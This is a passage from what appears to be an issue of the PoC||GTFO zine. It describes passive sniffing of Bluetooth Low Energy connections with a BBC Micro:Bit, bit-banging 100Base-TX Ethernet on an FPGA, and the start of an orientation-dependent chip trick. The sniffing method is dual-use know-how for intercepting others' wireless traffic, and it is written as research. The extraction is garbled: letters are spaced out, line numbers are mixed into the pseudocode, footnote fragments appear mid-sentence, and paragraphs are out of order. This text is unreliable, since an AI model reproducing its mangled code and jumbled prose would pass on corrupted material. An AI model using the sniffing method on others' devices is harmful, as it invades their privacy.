We need to know these values in order to cap-
ture every possible packets belonging to an active
connection, but we cannot get them directly as we
did not capture the connection request where we
would find them. We need to deduce these values
from captured packets, as we did for the CRC initial
value. In order to find out our first parameter, the
hop interval, Mike Ryan designed the simplest algo-
rithm that could be: measuring the time between
two packets received on a specific channel and di-
viding it by the number of channels used, i.e. 37.
So did I, but my measures did not seem really ac-
curate, as I got two distinct values rather than a
unique one. I was puzzled, as it would normally
have been straightforward as the algorithm is sim-
ple as hell. The only explanation was that a valid
packet was sent twice before the end of the hopping
cycle, whereas it should only have been sent once.
There was something wrong with the hopping cycle.
Improving Mike Ryan’s Algorithm
First of all, we need to determine the channels in use
by listening successively on each channel for a packet
with our expected access address and a valid CRC
value. If we get no packet during a certain amount
of time, then it means this channel is not part of the
hopping sequence. Theoretically, this may take up
to four seconds per channel, so not more than three
minutes to determine the channel map. This is a
significant amount of time, but luckily devices gen-
erally use more than half of the available channels
so it would be quicker.
Once the channel map is recovered, we need to
determine precisely the hop interval value associated
with the target connection. We may want our sniffer
to sit on a channel and measure the time between
two valid packets, but we have a problem problem:
if less than 37 channels are used, one or more chan-
nels may be reused to fill the gaps. This behavior
is due to a feature called “channel remapping” that
It seems Mike Ryan made an assumption that
was correct in 2013 but not today in 2017. I checked
the channels used by my connecting device, a Sam-
sung smartphone, and guess what? It was only using
28 channels out of 37, whereas Mike assumed all 37
data channels will be used. The good news is that
we now know the channel map is really important,
but the bad news is that we need to redesign the
connection parameters recovery process.
10 unzip
pocorgtfo17.pdf ubertooth.zip; unzip -c ubertooth.zip ubertooth/host/doc/ubertooth-btle.md | less
16is defined in the Bluetooth Low Energy specifica-
tions, which basically replace an unused channel by
another taken from the channel map. It means a
channel may appear twice (or more) in the hopping
sequence and therefore compromise the success of
Mike’s approach.
37 c h a n n e l s i n use , no remapping :
2 { 0 , 1 , 2 , 3 , . . . , 27 , 28 , 29 , 30 ,
3 1 , 3 2 , 3 3 , 3 4 , 3 5 , 3 6 , 37}
4
28 f i r s t c h a n n e l s i n u s e :
6 { 0 , 1 , 2 , 3 , . . . , 27 , 0 , 1 , 2 , 3 ,
4 , 5 , 6 , 7 , 8}
A possible workaround involves picking a chan-
nel that appears only once in the hopping sequence,
whatever the hop increment value. If we find such
a channel, then we just have to measure the time
between two packets, and divide this value by 37
to recover the hop interval value. The algorithm in
Figure 2 may be used to pick this channel.
This algorithm finds a unique channel only if
more than the half of the data channels are used, and
may possibly work for a fewer number of channels
depending on the hop increment value. This quick
method doesn’t require a huge amount of packets to
guess the hop interval.
The last parameter to recover is the hop incre-
ment, and Mike’s approach is also impacted by the
number of channels in use. His algorithm measures
the time between a packet on channel 0 and channel
1, and then relies on a lookup table to determine
the hop increment used. The problem is, if channel
1 appears twice then the measure is inaccurate and
the resulting hop increment value guessed wrong.
Again, we need to adapt this algorithm to a more
general case. My solution is to pick a second channel
derived from the first one we have already chosen to
recover the hop interval value, for which the corre-
sponding lookup table only contains unique values.
The lookup table is built as shown in Figure 3.
Eventually, we try every possible combination
and only keep one that does not contain duplicate
values, as shown in Figure 4.
Last but not least, in Figure 5 we build the
lookup table from these two carefully chosen chan-
nels, if any. This lookup table will be used to deduce
the hop increment value from the time between these
two channels.
171 f u n c t i o n generateLUT ( aa_sequences , f i r s t C h a n n e l , secondChannel ) :
aa_lookupTable = [ ] [ ]
3
f o r i n c r e m e n t in range ( 0 . . 1 2 ) do :
aa_lookupTable [ i n c r e m e n t ] = c o m p u t e D i s t a n c e ( aa_sequences , i n c r e m e n t ,
5
f i r s t C h a n n e l , secondChannel )
end f o r
7 end f u n c t i o n
9 f u n c t i o n c om p u t e D i s t a n c e ( aa_sequences , i n c r e m e n t , f i r s t C h a n n e l , secondChannel ) :
distance = 0
11
f c I n d e x = f i n d C h a n n e l I n d e x ( aa_sequences , i n c r e m e n t , f i r s t C h a n n e l , 0 )
s c I n d e x = f i n d C h a n n e l I n d e x ( aa_sequences , i n c r e m e n t , secondChannel , f c I n d e x )
13
i f ( s c I n d e x > f c I n d e x ) then do :
distance = ( scIndex − fcIndex )
15
e l s e do :
d i s t a n c e = ( s c I n d e x − f c I n d e x ) + 37
17
end i f
19
return d i s t a n c e
end f u n c t i o n
21
f u n c t i o n f i n d C h a n n e l I n d e x ( aa_sequences , i n c r e m e n t , c h a n n e l , s t a r t ) :
f o r i in range ( 0 . . 3 7 ) do :
i f aa _s eq uen ce s [ i n c r e m e n t ] [ ( s t a r t + i ) modulo 3 7 ] == c h a n n e l then do :
25
return ( ( s t a r t + i ) modulo 3 7 )
end i f
27
end f o r
end f u n c t i o n
23
Figure 3. Channel Lookup Table
2
4
6
8
10
12
14
16
18
20
f u n c t i o n p i c k S e c o n d C h a n n e l ( aa_sequences , a_channelMap , f i r s t C h a n n e l ) :
f o r c h a n n e l in range ( 0 . . 3 7 ) do :
i f a_channelMap c o n t a i n s c h a n n e l then do :
l o o k u p T a b l e = generateLUT ( aa_sequences , f i r s t C h a n n e l , c h a n n e l )
d u p l i c a t e s = FALSE
f o r i in range ( 0 . . 1 1 ) do :
f o r k in range ( i +1 . . 1 2 ) do :
i f l o o k u p T a b l e [ i ] == l o o k u p T a b l e [ k ] then do :
d u p l i c a t e s = TRUE
end i f
end f o r
end f o r
i f not d u p l i c a t e s then do :
return c h a n n e l
end i f
end i f
end f o r
return −1
end f u n c t i o n
Figure 4. Picking the Second Channel
181 f u n c t i o n deduceHopIncrement ( aa_sequences , f i r s t C h a n n e l , secondChannel ,
measure , h o p I n t e r v a l ) :
3
channelsJumped = measure / h o p I n t e r v a l
LUT = generateHopIncrementLUT ( aa_sequences , f i r s t C h a n n e l , secondChannel )
5
i f LUT[ channelsJumped ] > 0 then do :
return LUT[ channelsJumped ]
7
e l s e do :
return −1
9
end i f
end f u n c t i o n
11
f u n c t i o n generateHopIncrementLUT ( aa_sequences , f i r s t C h a n n e l , secondChannel ) :
13
reverseLUT = generateLUT ( aa_sequences , f i r s t C h a n n e l , secondChannel )
LUT = [ ]
15
f o r i in range ( 0 . . 3 7 ) do :
LUT[ i ] = 0
17
end f o r
f o r i in range ( 0 . . 1 2 ) do :
19
LUT[ reverseLUT [ i ] ] = i +5
end f o r
21
return LUT
23 end f u n c t i o n
Figure 5. Deducing the Hop Increment
Patching BBC Micro:Bit
Thanks to the designers of the BBC Micro:Bit, it
is possible to easily develop on this platform in C
and C++. Basically, they wrote a Device Abstrac-
tion Layer 11 that provides everything we need ex-
cept the radio, as they developed their own custom
protocol derived from Nordic Semiconductor Shock-
Burst protocol. We must get rid of it.
I removed all the useless code from this abstrac-
tion layer, the piece of code in charge of handling
every packet received by the RADIO module of
our nRF51822 in particular. I then substitute this
one with my own handler, in order to perform all
the sniffing without being annoyed by some hidden
third-party code messing with my packets.
Eventually, I coded a specific firmware for the
BBC Micro:Bit that is able to communicate with
a Python command-line interface, and that can be
used to detect and sniff existing connections. This
is not perfect and still a work in progress, but it can
passively sniff BLE connections. Of course, it may
lack the legacy sniffing method based on capturing
connection requests; that will be implemented later.
11 git
This tiny tool, dubbed ubitle, is able to enu-
merate every active Bluetooth Low Energy connec-
tions.
1 # python3 u b i t l e . py −s
u B i t l e v1 . 0 [ f i r m w a r e v e r s i o n 1 . 0 ]
3
[ i ] Listing available access addresses
5 [ − 46 dBm] 0 x8a9b8e58 | p k t s : 1
[ − 46 dBm] 0 x8a9b8e58 | p k t s : 2
7 [ − 46 dBm] 0 x8a9b8e58 | p k t s : 3
...
It is also able to recover the channel map used
by a given connection, as well as its hop interval and
increment.
1 # python3 u b i t l e . py −f 0 x8a9b8e58
u B i t l e v1 . 0 [ f i r m w a r e v e r s i o n 1 . 0 ]
3
[ i ] F o l l o w i n g c o n n e c t i o n 0 x8a9b8e58 . . .
5 [ i ] Recovered i n i t i a l CRC v a l u e : 0 x 1 6 e 9 d f
[ i ] R e c o v e r i n g c h a n n e l map .
7 [ i ] Recovered c h a n n e l map : 0 x 1 f f f f f f f f f
[ i ] R e c o v e r i n g hop i n t e r v a l . . .
9 [ i ] Recovered hop i n t e r v a l : 48
[ i ] R e c o v e r i n g hop i n c r e m e n t . . .
11 [ i ] Recovered hop i n c r e m e n t : 16
clone https://github.com/lancaster-university/microbit-dal
19Once all the parameters recovered, it may also
dump traffic to a PCAP file.
The resulting PCAP file may be opened in Wire-
shark to dissect the packets. You may notice the
keep-alive packets are missing from this capture. It
is deliberate; these packets are useless when analyz-
ing Bluetooth Low Energy communications.
1 # python3 u b i t l e . py −f 0 x8a9b8e58 \
−m 0 x 1 f f f f f f f f f −o t e s t . pcap
3 u B i t l e v1 . 0 [ f i r m w a r e v e r s i o n 1 . 0 ]
5 [ i ] F o l l o w i n g c o n n e c t i o n 0 x8a9b8e58 . . .
[ i ] Recovered i n i t i a l CRC v a l u e : 0 x 1 6 e 9 d f
7 [ i ] Forced c h a n n e l map : 0 x 1 f f f f f f f f f
[ i ] R e c o v e r i n g hop i n t e r v a l . . .
9 b ’ \xbcC\ x06 \x00X\ x8e \ x9b \ x8a0 \ x00 \ x f 1 ’
[ i ] Recovered hop i n t e r v a l : 48
11 [ i ] R e c o v e r i n g hop i n c r e m e n t . . .
[ i ] Recovered hop i n c r e m e n t : 16
13 [ i ] A l l p a r a m e t e r s s u c c e s s f u l l y r e c o v e r e d ,
f o l l o w i n g BLE c o n n e c t i o n . . .
15 LL Data : 02 07 03 00 04 00 0 a 03 00
LL Data : 0 a 0 a 06 00 04 00 0b 70 6 f 75 65 74
17 LL Data : 02 07 03 00 04 00 0 a 05 00
LL Data : 0 a 07 03 00 04 00 0b 00 00
19 LL Data : 02 07 03 00 04 00 0 a 03 00
LL Data : 0 a 0 a 06 00 04 00 0b 70 6 f 75 65 74
12 git
Source code
The source code of this project is available on
Github under GPL license, feel free to submit bugs
and pull requests. 12
This tool does not support dynamic channel map
update or connection request based sniffing, which
are implemented in Nordic Semiconductor’s closed
source sniffer. It’s PoCkGTFO so take my little tool
as it is: a proof of concept demonstrating that it is
possible to passively sniff BLE connections for less
than twenty bucks, with a device one may easily find
on the Internet.
clone https://github.com/virtualabs/ubitle-firmware || unzip pocorgtfo17.pdf ubitle.tgz
2017:05
Up close and personal with Ethernet.
by Andrew D. Zonenberg,
because real hackers don’t need PHYs or NICs!
MII and Ethernet framing
If you’re reading this, you’ve almost certainly
used Ethernet on a PC by means of the BSD sockets
API. You’ve probably poked around a bit in Wire-
shark and looked at the TCP/IP headers on your
packets. But what happens after the kernel pushes a
completed Ethernet frame out to the network card?
A PC network card typically contains three main
components. These were separate chips in older de-
signs, but many modern cards integrate them all
into one IC. The bus controller speaks PCIe, PCI,
ISA, or some other protocol to the host system, as
well as generating interrupts and handling DMA.
The MAC (Media Access Controller) is primarily
responsible for adding the Ethernet framing to the
outbound packet. The MAC then streams the out-
bound packet over a “reconciliation sublayer” inter-
face to the PHY (physical layer), which converts the
packet into electrical or optical impulses to travel
over the cabling. This same process runs in the op-
posite direction for incoming packets.
In an embedded microcontroller or SoC plat-
form, the bus controller and MAC are typically in-
tegrated on the same die as the CPU, however the
PHY is typically a separate chip. FPGA-based sys-
tems normally implement a MAC on the FPGA and
connect to an external PHY as well; the bus con-
troller may be omitted if the FPGA design sends
data directly to the MAC. Although the bus con-
troller and its firmware would be an interesting tar-
get, this article focuses on the lowest levels of the
stack.
The reconciliation sublayer is the lowest (fully digi-
tal) level of the Ethernet protocol stack that is typ-
ically exposed on accessible PCB pins. For 10/100
Ethernet, the base protocol is known as MII (Media
Independent Interface). It consists of seven digital
signals each for the TX and RX buses: a clock (2.5
MHz for 10Base-T, 25 MHz for 100Base-TX), a data
valid flag, an error flag, and a 4-bit parallel bus con-
taining one nibble of packet data. Other commonly
used variants of the protocol include RMII (reduced-
pin MII, a double-data-rate version, which uses less
pins), GMII (gigabit MII, that increases the data
width to 8 bits and the clock to 125 MHz), and
RGMII (a DDR version of GMII using less pins). In
all of these interfaces, the LSB of the data byte/nib-
ble is sent on the wire first.
An Ethernet frame at the reconciliation sublayer
consists of a preamble (seven bytes of 0x55), a start
frame delimiter (SFD, one byte of 0xD5), the 6-byte
destination and source MAC addresses, a 2-byte
EtherType value indicating the upper layer protocol
(for example 0x0800 for IPv4 or 0x86DD for IPv6),
the packet data, and a 32-bit CRC-32 of the packet
body (not counting preamble or SFD). The byte val-
ues for the preamble and SFD have a special signifi-
cance that will be discussed in the following section.
10Base-T Physical Layer
The simplest form of Ethernet still in common use
is known as 10Base-T (10 Mbps, baseband signal-
ing, twisted pair media). It runs over a cable con-
taining two twisted pairs with 100 ohm differential
impedance. Modern deployments typically use Cat-
egory 5 cabling, which contains four twisted pairs.
The orange and green pairs are used for data (one
pair in each direction), while the blue and brown
pairs are unused.
When the line is idle, there is no voltage dif-
ference between the positive (white with stripe) and
negative (solid colored) wires in the twisted pair. To
send a 1 or 0 bit, the PHY drives 2.5V across the
pair; the direction of the difference indicates the bit
value. This technique allows the receiver to reject
noise coupled into the signal from external electro-
21magnetic fields: since the two wires are very close to-
gether the induced voltages will be almost the same,
and the difference is largely unchanged.
Unfortunately, we cannot simply serialize the
data from the MII bus out onto the differential
pair; that would be too easy! Several problems can
arise when connecting computers (potentially sev-
eral hundred feet apart) with copper cables. First,
it’s impossible to make an oscillator that runs at ex-
actly 20 MHz, so the oscillators providing the clocks
to the transmit and receive NIC are unlikely to be
exactly in sync. Second, the computers may not
have the same electrical ground. A few volts offset
in ground between the two computers can lead to
high current flow through the Ethernet cable, po-
tentially destroying both NICs.
In order to fix these problems, an additional line
coding layer is used: Manchester coding. This is
a simple 1:2 expansion that replaces a 0 bit with
01 and a 1 bit with 10, increasing the raw data rate
from 10 Mbps (100 ns per bit) to 20 Mbps (50 ns per
bit). This results in a guaranteed 1–0 or 0–1 edge
for every data bit, plus sometimes an additional edge
between bits.
Since every bit has a toggle in the middle of it,
any 100 ns period without one must be the space be-
tween bits. This allows the receiver to synchronize
to the bit stream; and then the edge in the middle
of each bit can be decoded as data and the receiver
can continually adjust its synchronization on each
edge to correct for any slight mismatches between
the actual and expected data rate. This property of
Manchester code is known as self clocking.
Another useful property of the Manchester code
is that, since the signal toggles at a minimum rate of
10 MHz, we can AC couple it through a transformer
or (less commonly) capacitors. This prevents any
problems with ground loops or DC offsets between
the endpoints, as only changes in differential voltage
pass through the cables.
We now see the purpose of the 55 55 ... D5
preamble: the 0x55’s provide a steady stream of
meaningless but known data that allows the receiver
to synchronize to the bit clock, then the 0xD5 has
a single bit flipped at a known position. This al-
lows the receiver to find the boundary between the
preamble and the packet body.
That’s it! This is all it takes to encode and de-
code a 10Base-T packet. Figure 6 shows what this
waveform actually looks like on an oscilloscope.
13 git
One last bit to be aware of is that, in between
packets, a link integrity pulse (LIT) is sent every 16
milliseconds of idle time. This is simply a +2.5V
pulse about 100 ns long, to tell the remote end, “I’m
still here.” The presence or absence of LITs or data
traffic is how the NIC decides whether to declare the
link up.
By this point, dear reader, you’re probably
thinking that this doesn’t sound too hard to bit-
bang — and you’d be right! This has in fact been
done, most notably by Charles Lohr on an ATTiny
microcontroller. 13 All you need is a pair of 2.5V
GPIO pins to drive the output, and a single input
pin.
100Base-TX Physical Layer
The obvious next question is, what about the next
step up, 100Base-TX Ethernet? A bit of Googling
failed to turn up anyone who had bit-banged it. How
hard can it really be? Let’s take a look at this pro-
tocol in depth!
First, the two ends of the link need to decide
what speed they’re operating at. This uses a clever
extension of the 10Base-T LIT signaling: every 16
ms, rather than sending a single LIT, the PHY sends
17 pulses – identical to the 10Base-T LIT, but re-
named fast link pulse (FLP) in the new standard
– at 125 μs spacing. Each pair of pulses may op-
tionally have an additional pulse halfway between
them. The presence or absence of this additional
pulse carries a total of 16 bits of data.
Since FLPs look just like 10Base-T LITs, an
older PHY which does not understand Ethernet
auto-negotiation will see this stream of pulses as
a valid 10Base-T link and begin to send packets.
A modern PHY will recognize this and switch to
10Base-T mode. If both ends support autonego-
tiation, they will exchange feature descriptors and
switch to the fastest mutually-supported operating
mode.
Figure 7 shows an example auto-negotiation
frame. The left 5 data bits indicate this is an 802.3
base auto-negotiation frame (containing the feature
bitmask); the two 1 data bits indicate support for
100Base-TX at both half and full duplex.
Supposing that both ends have agreed to operate
at 100Base-TX, what happens next? Let’s look at
the journey a packet takes, one step at a time from
the sender’s MII bus to the receiver’s.
clone https://github.com/cnlohr/ethertiny || unzip pocorgtfo17.pdf ethertiny.zip
22Figure 6. 10Base-T Waveform
Figure 7. Autonegotiation Frame
a rather unusual modulation known as MLT-3. This
is a pseudo-sine waveform which cycles from 0V to
+1V, back to 0V, down to −1V, and then back to
0 again. To send a 1 bit the waveform is advanced
to the next cycle; to send a 0 bit it remains in the
current state for 8 nanoseconds. The following is an
example of MLT-3 coded data transmitted by one
of my Cisco switches, after traveling through sev-
eral meters of cable.
First, the 4-bit nibble is expanded into 5 bits by
a table lookup. This 4B/5B code adds transitions to
the signal just like Manchester coding, to facilitate
clock synchronization at the receiver. Additionally,
some additional codes (not corresponding to data
nibbles) are used to embed control information into
the data stream. These are denoted by letters in the
standard.
The first two nibbles of the preamble are then
replaced with control characters J and K. The re-
maining nibbles in the preamble, SFD, packet, and
CRC are expanded to their 5-bit equivalents. Con-
trol characters T and R are appended to the end of
the packet. Finally, unlike 10Base-T, the link does
not go quiet between packets; instead, the control
character I (idle) is continuously transmitted.
The encoded parallel data stream is serialized to
a single bit at 125 Mbps, and scrambled by XOR-
ing it with a stream of pseudorandom bits from a
linear feedback shift register, using the polynomial
x 1 1 + x 9 + 1. If the data were not scrambled, pat-
terns in the data (especially the idle control char-
acter) would result in periodic signals being driven
onto the wire, potentially causing strong electromag-
netic interference in nearby equipment. By scram-
bling the signal these patterns are broken up, and
the radiated noise emits weakly across a wide range
of frequencies rather than strongly in one.
Finally, the scrambled data is transmitted using
MLT-3 is used because it is far more spectrally
efficient than the Manchester code used in 10Base-
T. Since it takes four 1 bits to trigger a full cycle
of the waveform, the maximum frequency is 1/4 of
the 125 Mbps line rate, or 31.25 MHz. This is only
about 1.5 times higher than the 20 MHz bandwidth
required to transmit 10Base-T, and allows 100Base-
TX to be transmitted over most cabling capable of
carrying 10Base-T.
The obvious question is, can we bit-bang it? Cer-
tainly! Since I didn’t have a fast enough MCU, I
built a test board (Figure 8) around an old Spartan-
6 FPGA left over from an abandoned project years
ago.
23Figure 8. Spartan-6 Test Board
24Bit-Banging 100Base-TX
Luckily for us, 10Base-T requires a pretty hefty
dose of drive current. In order to ensure we could
drive the line hard enough, two more FPGA pins
were connected in parallel to each side of the TX-
side transformer through 16-ohm resistors. By par-
alleling these two pins, the available current is sig-
nificantly increased.
After a bit of tinkering, I discovered that by
configuring one of the 10Base-T drive pins as LVC-
MOS33, slow slew, 2 mA drive, and turning it on for
2 nanoseconds during the transition from the +/−1
state to the 0 state, I could provide just enough
of a shove that the signal reached the zero mark
quickly while not overshooting significantly. Since
the PHY itself runs at only 125 MHz, the Spartan-6
OSERDES2 block was used to produce a pulse last-
ing 1/4 of a PHY clock cycle. Figure 12 shows the
resulting waveforms. 15
At this point sending the auto-negotiation wave-
forms is trivial: The other FPGA pin connected to
the 16 ohm resistor is turned on for 100 ns, then
off. With a Spartan-6 I had good results with LVC-
MOS33, fast slew, 24 mA drive for these pins. If ad-
ditional drive strength is required the pre-emphasis
drivers can be enabled in parallel, but I didn’t find
this to be necessary in my testing.
These same pins could easily be used for 10Base-
T output as well (to enable a dual-mode 10/100
PHY) but I didn’t bother to implement this. People
have already demonstrated successful bitbanging of
10Base-T, and it’s not much of a POC if the concept
is already proven.
That’s it, we’re done! We can now send 100Base-
TX signals using six FPGA pins and six resistors!
A block diagram of the PHY, randomly code-named
TRAGICLASER by @NSANameGen 14 , is shown in
Figure 9.
The transmit-side 4B/5B coding, serializing, and
LFSR scrambler are straightforward digital logic at
moderate to slow clock rates in the FPGA, so we
won’t discuss their implementation in detail.
Generating the signal requires creating three dif-
ferential voltages: 0, +1, and −1. Since most FPGA
I/O buffers cannot operate at 1.0V, or output neg-
ative voltages, a bit of clever circuitry is required.
We use a pair of 1K ohm resistors to bias the
center tap of the output transformer to half of the
3.3V supply voltage (1.65V). The two ends of the
transformer coil are connected to FPGA I/O pins.
Since each I/O pin can pull high or low, we have
a form of the classic H-bridge motor driver circuit.
By setting one pin high and the other low, we can
drive current through the line in either direction.
By tri-stating both pins and letting the terminating
resistor dissipate any charge built up in the cable
capacitance, we can create a differential 0 state.
Since we want to drive +/− 1V rather than 3.3V,
we need to add a resistor in series with the FPGA
pins to reduce the drive current such that the re-
ceiver sees 1V across the 100 ohm terminator. Ex-
perimentally, good results were obtained with 100
ohm resistors in series with a Spartan-6 FPGA pin
configured as LVCMOS33, fast slew, 24 mA drive.
For other FPGAs with different drive characteris-
tics, the resistor value may need to be slightly ad-
justed. This circuit is shown in Figure 10.
This produced a halfway decent MLT-3 wave-
form, and one that would probably be understood
by a typical PHY, but the rise and fall times as the
signal approached the 0V state were slightly slower
than the 5 ns maximum permitted by the 802.3 stan-
dard (see Figure 11).
The solution to this is a clever technique from
the analog world known as pre-emphasis. This is a
fancy way of saying that you figure out what dis-
tortions your signal will experience in transit, then
apply the reverse transformation before sending it.
In our case, we have good values when the signal is
stable but during the transitions to zero there’s not
enough drive current. To compensate, we simply
need to give the signal a kick in the right direction.
Decoding 100Base-TX
Now that we can generate the signals, we have to
decode the incoming data from the other side. How
can we do this?
Most modern FPGAs are able to accept differ-
ential digital inputs, such as LVDS, using the I/O
buffers built into the FPGA. These differential in-
put buffers are essentially comparators, and can be
abused into accepting analog signals within the op-
erating range of the FPGA.
By connecting an input signal to the positive
input of several LVDS input buffers, and driving
the negative inputs with an external resistor ladder,
14 https://twitter.com/NSANameGen/status/910628839566594050
15 This wavefrom was captured with a 115 ohm drive resistor instead of 100, causing the output voltage to be closer to 0.9V
than the intended 1.0V. After correcting the resistor value, the amplitude was close to perfect.
25Figure 9. TRAGICLASER Block Diagram
Figure 10. H-Bridge Schematic
26Figure 11. Halfway-Decent Waveform
27Figure 12. Waveform using Premphasis
cesses 4 ADC samples per cycle. Every time the
data changes the decoder outputs a 1 bit. Every
time the data remains steady for one UI, plus an
additional sample before and after, the decoder out-
puts a 0 bit. (The threshold of six ADC samples was
determined experimentally to give the best bit error
rate.) The decoder nominally outputs one data bit
per clock however due to jitter and skew between
the TX and RX clocks, it occasionally outputs zero
or two bits.
The decoded data stream is then deserialized
into 5-bit blocks to make downstream processing
easier. Every 32 blocks, the last 11 bits from the
MLT-3 decoder are complemented and loaded into
the LFSR state. Since the 4B/5B idle code is
0x1F (five consecutive 1 bits), the complement of
the scrambled data between packets is equal to the
scrambler PRNG output. An LFSR leaks 1 bit of
internal state per output bit, so given N consecu-
tive output bits from a N-bit LFSR, we can recover
the entire state. The interval of 32 blocks (160 bits)
was chosen to be relatively prime to the 11-bit LFSR
state size.
After the LFSR is updated, the receiver begins
XOR-ing the scrambler output with the incoming
data stream and checks for nine consecutive idle
characters (45 bits). If present, we correctly guessed
we can create a low-resolution flash ADC! Since we
only need to distinguish between three voltage lev-
els (there’s no need to distinguish the +1 and +2.5,
or −1 and −2.5, states as they’re never used at the
same time) we can use two comparators to create an
ADC with approximately 1.5 bit resolution.
There’s just one problem: this is a single-ended
ADC with an input range from ground to Vdd, and
our incoming signal is differential with positive and
negative range. Luckily, we can work around this
by tying the center tap of the transformer to 1.65V
via equal valued resistors to 3.3V and ground, thus
biasing the signal into the 0–3.3V range. See Fig-
ure 13.
After we connect the required 100 ohm terminat-
ing resistor across the transformer coil, the voltages
at the positive and negative sides of the coil should
be equally above and below 1.65V. We can now con-
nect our ADC to the positive side of the coil only,
ignoring the negative leg entirely aside from the ter-
mination.
The ADC is sampled at 500 Msps using the
Spartan-6 ISERDES. Since the nominal data rate
is 125 Mbps, we have four ADC samples per unit
interval (UI). We now need to recover the MLT-3
encoded data from the oversampled data stream.
The MLT-3 decoder runs at 125 MHz and pro-
28Figure 13. Biasing Schematic
ters) is fed into an 32-nibble FIFO. When the FIFO
reaches a fill of 16 nibbles (8 bytes), the PHY be-
gins to stream the inbound packet out to the MII
bus. We can thus correct for small clock rate mis-
matches, up to the point that the FIFO underflows
or overflows during one packet time.
the location of an inter-packet gap and are locked to
the scrambler, with probability 1 − (2 −45 ) of a false
lock due to the data stream coincidentally match-
ing the LFSR output. If not present, we guessed
wrong and re-try every 32 data blocks until a lock
is achieved. Since 100Base-TX specifies a minimum
96-bit inter-frame gap, and we require 45 + 11 = 56
idle bits to lock, we should eventually guess right
and lock to the scrambler.
Once the scrambler is locked, we can XOR the
scrambler output (5 bits at a time) with the incom-
ing 5-bit data stream. This gives us cleartext 4B/5B
data, however we may not be aligned to code-word
boundaries. The idle pattern doesn’t contain any
bit transitions so there’s no clues to alignment there.
Once a data frame starts, however, we’re going to
see a J+K control character pair (11000 10001). The
known position of the zero bits allows us to shift the
data by a few bits as needed to sync to the 4B/5B
code groups.
Decoding the 4B/5B is a simple table lookup
that outputs 4-bit data words. When the J+K or
T+R control codes are seen, a status flag is set to
indicate the start or end of a packet.
If an invalid 5-bit code is seen, an error counter is
incremented. Sixteen code errors in a 256-codeword
window, or four consecutive packet times without
any inter-frame gap, indicate that we may have lost
sync with the incoming data or that the cable may
have been unplugged. In this case, we reset the en-
tire PHY circuit and attempt to re-negotiate a link.
The final 4-bit data stream may not be running
at exactly the same speed as the 25 MHz MII clock,
due to differences between TX and RX clock do-
mains. In order to rate match, the 4-bit data com-
ing off the 4B/5B decoder (excluding idle charac-
29Test Results
Overall, I was quite surprised at how well the
PHY worked. Although I certainly hoped to get it
to the point that it would be able to link up with
another PHY and send packets, I did not expect the
TX waveform to be as clean as it was. Although
the RX likely does not meet the full 802.3 sensi-
tivity requirements, it is certainly good enough for
short-range applications. The component cost and
PCB space used by the external passives compare fa-
vorably with an external 10/100 PHY if standards
compliance or long range are not required.
Source code is available in my Antikernel
project. 16
In my testing, the TRAGICLASER PHY was able
to link up with both my laptop and my Cisco switch
with no issues through an approximately 2-meter
patch cable. No testing with longer cables was per-
formed because I didn’t have anything longer on
hand, however since the signal appears to pass the
802.3 eye mask I expect that the transmitter would
be able to drive the full 100m cable specified in the
standard with no difficulties. The receiver would
likely start to fail with longer cables since I’m not
doing equalization or adaptive thresholding, how-
ever I can’t begin to guess how much you could get
actually away with. If anybody decides to try, I’d
love to hear your results!
My test bitstream doesn’t include a full 10/100
MAC, so verification of incoming data from the LAN
was conducted with a logic analyzer on the RX-side
MII bus. (Figure 14.)
The transmit-side test sends a single hard-coded
UDP broadcast packet in a loop. I was able to pick
it up with Wireshark (Figure 15) and decode it. My
switch did not report any RX-side CRC errors dur-
ing a 5-minute test period sending at full line rate.
In my test with default optimization settings, the
PHY had a total area of 174 slices, 767 LUT6s, and
8 LUTRAMs as well as four OSERDES2 and two
ISERDES2 blocks. This is approximately 1/4 of the
smallest Spartan-6 FPGA (XC6SLX4) so it should
be able to comfortably fit into almost any FPGA
design. Additionally, twelve external resistors and
an RJ-45 jack with integrated isolation transformer
were required.
Further component reductions could be achieved
if a 1.5 or 1.8V supply rail were available on the
board, which could be used (along with two exter-
nal resistors) to inject the DC bias into the coupling
transformer taps at a savings of two resistors. An
enterprising engineer may be tempted to use the in-
ternal 100 ohm differential terminating resistors on
the FPGA to eliminate yet another passive at the
cost of two more FPGA pins, however I chose not to
go this route because I was concerned that dissipat-
ing 10 mW in the input buffer might overheat the
FPGA.
16 git
clone https://github.com/azonenberg/antikernel || unzip pocorgtfo17.zip antikernel.zip
30Figure 14. Receiver Verification
Figure 15. Wireshark
3117:06
The DIP Flip Whixr Trick:
An Integrated Circuit That Functions in Either Orientation
by Joe “Kingpin” Grand
Hardware trickery comes in many shapes and
sizes: implanting add-on hardware into a finished
product, exfiltrating data through optical, thermal,
or electromagnetic means, injecting malicious code
into firmware, BIOS, or microcode, or embedding
Trojans into physical silicon. Hackers, governments,
and academics have been playing in this wide open
field for quite some time and there’s no sign of things
slowing down.
This PoC, inspired by my friend Whixr of
#tymkrs, demonstrates the feasibility of an IC be-
having differently depending on which way it’s con-
nected into the system. Common convention states
that ICs must be inserted in their specified orien-
tation, assisted by the notch or key on the device
identifying pin 1, in order to function properly.
So, let’s defy this convention!
–——–
———
—–—–
Most standard chips, like digital logic devices
and microcontrollers, place the power and ground
connections at corners diagonal from each other. If
one were to physically rotate the IC by 180 degrees,
power from the board would connect to the ground
pin of the chip or vice versa. This would typically
result in damage to the chip, releasing the magic
smoke that it needs to function. The key to this
PoC was finding an IC with a more favorable pin
configuration.
While searching through microcontroller data
sheets, I came across the Microchip PIC12F629.
This particular 8-pin device has power and GPIO
(General Purpose I/O) pins in locations that would
allow the chip to be rotated with minimal risk. Of
course, this PoC could be applied to any chip with
a suitable pin configuration.
In the pinout drawing, which shows the chip from
above in its normal orientation, arrows denote the
alternate functionality of that particular pin when
the chip is rotated around. Since power (VDD) is
normally connected to pin 1 and ground (VSS) is
normally connected to pin 8, if the chip is rotated,
GP2 (pin 5) and GP3 (pin 4) would connect to power
and ground instead. By setting both GP2 and GP3
to inputs in firmware and connecting them to power
and ground, respectively, on the board, the PIC will
be properly powered regardless of orientation.
–——–
———
—–—–
I thought it would be fun to change the data
that the PIC sends to a host PC depending on its
orientation.
On power-up of the PIC, GP1 is used to detect
the orientation of the device and set the mode ac-
cordingly. If GP1 is high (caused by the pull-up
resistor to VCC), the PIC will execute the normal
code. If GP1 is low (caused by the pull-down re-
sistor to VSS), the PIC will know that it has been
rotated and will execute the alternate code. This
orientation detection could also be done using GP5,
but with inverted polarity.
The PIC’s UART (asynchronous serial) output
is bit-banged in firmware, so I’m able to reconfigure
the GPIO pins used for TX and RX (GP0 and GP4)
on-the-fly. The TX and RX pins connect directly to
